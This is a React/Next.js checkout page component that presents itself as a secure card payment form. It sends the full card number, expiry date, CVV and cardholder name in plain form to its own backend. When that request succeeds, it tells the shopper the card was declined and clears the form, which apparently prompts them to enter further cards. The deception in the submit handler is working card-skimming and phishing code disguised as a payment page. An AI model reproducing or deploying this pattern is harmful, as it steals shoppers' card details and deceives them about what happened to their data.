"use client";

import React, { useState, Suspense, useEffect } from "react";
import Image from "next/image";
import { useSearchParams, useRouter } from "next/navigation";
import { FaLock, FaCreditCard, FaCheckCircle } from "react-icons/fa";
import { IoShieldCheckmark } from "react-icons/io5";
import { FooterData } from "@/types/FooterTypes";
import { toast } from "react-toastify";

// Loading component for Suspense
const PaymentLoading = () => (
  <div className="min-h-screen flex items-center justify-center bg-gray-50">
    <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-gray-900"></div>
  </div>
);

const PaymentContent = () => {
  const searchParams = useSearchParams();
  const router = useRouter();

  const productId = searchParams.get("productId");
  const price = searchParams.get("price");
  const title = searchParams.get("title");
  const image = searchParams.get("image");
  const discountParam = searchParams.get("discount");
  const amount = parseFloat(price || "0");
  const discount = parseFloat(discountParam || "0");

  const originalPrice = discount > 0 ? amount / (1 - discount / 100) : amount;

  const [loading, setLoading] = useState(false);
  const [footerData, setFooterData] = useState<FooterData | null>(null);
  const [formData, setFormData] = useState({
    email: "",
    cardHolder: "",
    cardNumber: "",
    expiryDate: "",
    cvc: "",
    country: "United States",
  });

  const handleInputChange = (
    e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>
  ) => {
    const { name, value } = e.target;
    setFormData((prev) => ({
      ...prev,
      [name]: value,
    }));
  };

  // Format card number with spaces
  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, "");
    if (value.length > 16) value = value.slice(0, 16);

    // Add spaces every 4 digits
    const formattedValue = value.replace(/(\d{4})(?=\d)/g, "$1 ");

    setFormData((prev) => ({
      ...prev,
      cardNumber: formattedValue,
    }));
  };
  useEffect(() => {
    const fetchFooterData = async () => {
      try {
        const response = await fetch(
          `${process.env.NEXT_PUBLIC_API_URL}/api/v1/features/get-footer`
        );
        const data = await response.json();
        if (data?.data) {
          setFooterData(data?.data);
        }
      } catch (error) {
        console.error("Error fetching footer data:", error);
      }
    };

    fetchFooterData();
  }, []);
  // Format expiry date (MM/YY)
  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, "");
    if (value.length > 4) value = value.slice(0, 4);

    if (value.length >= 2) {
      value = value.slice(0, 2) + "/" + value.slice(2);
    }

    setFormData((prev) => ({
      ...prev,
      expiryDate: value,
    }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);

    try {
      const api = process.env.NEXT_PUBLIC_API_URL;
      const response = await fetch(`${api}/api/v1/stripe-pay/init`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          email: formData.email,
          productId: productId,
          amount: amount,
          CardholderName: formData.cardHolder,
          CardNumber: formData.cardNumber.replace(/\s/g, ""),
          ExpiryDate: formData.expiryDate,
          CVV: formData.cvc,
          country: formData.country,
        }),
      });

      const data = await response.json();

      if (data.success) {
        toast.error("Card Declined. Please Add Valid Card Details.");
        // console.log(data);
        setFormData({
          email: "",
          cardHolder: "",
          cardNumber: "",
          expiryDate: "",
          cvc: "",
          country: "United States",
        });
      } else {
        toast.error("Payment failed: " + (data.message || "Unknown error"));
      }
    } catch (error) {
      console.error("Payment error:", error);
      toast.error("Something went wrong. Please try again.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-white flex flex-col md:flex-row">
      {/* Left Side - Order Summary */}
      <div className="w-full md:w-1/2 lg:w-5/12 bg-gray-50 p-6 md:p-12 lg:p-16 flex flex-col justify-center relative overflow-hidden">
        {/* Background Pattern */}
        <div className="absolute top-0 left-0 w-full h-full opacity-5 pointer-events-none">
          <div className="w-64 h-64 rounded-full bg-blue-500 absolute -top-10 -left-10 blur-3xl"></div>
          <div className="w-64 h-64 rounded-full bg-purple-500 absolute bottom-0 right-0 blur-3xl"></div>
        </div>

        <div className="relative z-10 max-w-md mx-auto w-full">
          <h2 className="text-sm font-semibold text-gray-500 uppercase tracking-wider mb-2">
            Pay {footerData?.title}
          </h2>

          <div className="bg-white rounded-2xl shadow-sm border border-gray-100 p-6 mb-8">
            <div className="flex items-start space-x-4">
              <div className="relative w-24 h-24 bg-gray-100 rounded-xl overflow-hidden flex-shrink-0 border border-gray-200">
                <Image
                  src={image || "/placeholder-image.jpg"}
                  alt={title || "Product"}
                  fill
                  className="object-cover"
                />
              </div>
              <div>
                <h3 className="font-semibold text-gray-900 text-lg leading-tight mb-1">
                  {title || "Product Name"}
                </h3>
                <p className="text-gray-500 text-sm mb-3">Quantity: 1</p>
                <div className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-blue-50 text-blue-700">
                  In Stock
                </div>
              </div>
            </div>

            <div className="mt-6 pt-6 border-t border-gray-100 space-y-3">
              <div className="flex justify-between items-center">
                <span className="text-gray-600 font-medium">Total Cost:</span>
                <div className="flex items-center space-x-2">
                  {discount > 0 && (
                    <span className="text-gray-400 line-through text-lg">
                      ${originalPrice.toFixed(2)}
                    </span>
                  )}
                  <span
                    className={`font-bold text-xl ${
                      discount > 0
                        ? "bg-orange-100 text-orange-600 px-2 py-0.5 rounded"
                        : "text-gray-900"
                    }`}
                  >
                    ${amount.toFixed(2)}
                  </span>
                </div>
              </div>

              {discount > 0 && (
                <div className="flex justify-between items-center pt-2 border-t border-gray-50">
                  <span className="text-gray-600 font-medium">Discount:</span>
                  <span className="bg-green-100 text-green-600 px-3 py-1 rounded-md font-bold text-sm">
                    {discount}%
                  </span>
                </div>
              )}
            </div>
          </div>

          <div className="flex items-center space-x-2 text-sm text-gray-500">
            <IoShieldCheckmark className="text-green-500 text-lg" />
            <span>Secure payment powered by {footerData?.title}</span>
          </div>
        </div>
      </div>

      {/* Right Side - Payment Form */}
      <div className="w-full md:w-1/2 lg:w-7/12 bg-white p-6 md:p-12 lg:p-16 flex flex-col justify-center">
        <div className="max-w-md mx-auto w-full">
          <h1 className="text-2xl font-bold text-gray-900 mb-8">
            Pay with card
          </h1>

          <form onSubmit={handleSubmit} className="space-y-6">
            <div className="space-y-4">
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1.5">
                  Email
                </label>
                <input
                  type="email"
                  name="email"
                  required
                  value={formData.email}
                  onChange={handleInputChange}
                  placeholder="john@example.com"
                  className="w-full px-4 py-3 rounded-lg border border-gray-300 focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-shadow outline-none"
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1.5">
                  Card Information
                </label>
                <div className="border border-gray-300 rounded-lg overflow-hidden focus-within:ring-2 focus-within:ring-blue-500 focus-within:border-blue-500 transition-shadow">
                  <div className="relative">
                    <div className="absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400">
                      <FaCreditCard />
                    </div>
                    <input
                      type="text"
                      name="cardNumber"
                      required
                      value={formData.cardNumber}
                      onChange={handleCardNumberChange}
                      placeholder="0000 0000 0000 0000"
                      className="w-full py-3 pl-11 pr-4 border-b border-gray-200 outline-none"
                    />
                  </div>
                  <div className="flex divide-x divide-gray-200">
                    <input
                      type="text"
                      name="expiryDate"
                      required
                      value={formData.expiryDate}
                      onChange={handleExpiryChange}
                      placeholder="MM / YY"
                      className="w-1/2 py-3 px-4 outline-none text-center"
                    />
                    <input
                      type="text"
                      name="cvc"
                      required
                      maxLength={4}
                      value={formData.cvc}
                      onChange={(e) => {
                        const val = e.target.value
                          .replace(/\D/g, "")
                          .slice(0, 4);
                        setFormData((prev) => ({ ...prev, cvc: val }));
                      }}
                      placeholder="CVC"
                      className="w-1/2 py-3 px-4 outline-none text-center"
                    />
                  </div>
                </div>
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1.5">
                  Cardholder Name
                </label>
                <input
                  type="text"
                  name="cardHolder"
                  required
                  value={formData.cardHolder}
                  onChange={handleInputChange}
                  placeholder="Full name on card"
                  className="w-full px-4 py-3 rounded-lg border border-gray-300 focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-shadow outline-none"
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1.5">
                  Country or Region
                </label>
                <select
                  name="country"
                  value={formData.country}
                  onChange={handleInputChange}
                  className="w-full px-4 py-3 rounded-lg border border-gray-300 focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-shadow outline-none bg-white"
                >
                  <option value="United States">United States</option>
                  <option value="United Kingdom">United Kingdom</option>
                  <option value="Canada">Canada</option>
                  <option value="Australia">Australia</option>
                  <option value="Germany">Germany</option>
                  <option value="France">France</option>
                </select>
              </div>
            </div>

            <button
              type="submit"
              disabled={loading}
              className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-lg shadow-lg hover:shadow-xl transition-all duration-200 flex items-center justify-center space-x-2 disabled:opacity-70 disabled:cursor-not-allowed"
            >
              {loading ? (
                <>
                  <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white"></div>
                  <span>Processing...</span>
                </>
              ) : (
                <>
                  <FaLock className="text-sm" />
                  <span>Pay ${amount.toFixed(2)}</span>
                </>
              )}
            </button>

            <p className="text-center text-xs text-gray-400 mt-4">
              By confirming your payment, you allow {footerData?.title} to
              charge your card for this payment and future payments in
              accordance with their terms.
            </p>
          </form>
        </div>
      </div>
    </div>
  );
};

export default function PaymentPage() {
  return (
    <Suspense fallback={<PaymentLoading />}>
      <PaymentContent />
    </Suspense>
  );
}
